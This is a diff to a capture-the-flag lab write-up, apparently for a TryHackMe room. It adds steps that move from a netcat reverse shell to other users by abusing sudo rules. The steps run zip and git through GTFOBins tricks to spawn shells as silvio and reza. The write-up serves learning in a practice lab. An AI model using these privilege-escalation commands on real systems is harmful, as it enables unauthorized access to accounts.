@@ -149,3 +149,32 @@ nc -lvnp {port}
 ```
 
 ---
+
+#### Silvio's Flag
+
+While you still on the `RevShell` of dalia go and list the commands that dalia allowed to run as `sudo`
+
+```bash
+sudo -l
+```
+
+then you will find that `dalia` can run the `zip` command as a `sudo` so search for it's script on [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and add before it `sudo -u` to run it as `Silvio`, the script will be like that:
+
+```bash
+TF=$(mktemp -u)
+sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF
+```
+and get your flag....
+
+**a fast note, the hint on `THM` says "Check the Postal Code on the address." it means the `zip` command , very silly ain't it ?!**
+
+---
+#### Reza's Flag
+
+The same as `silvio` but it is a `git` permissions:
+```bash
+sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+``` 
+
+---
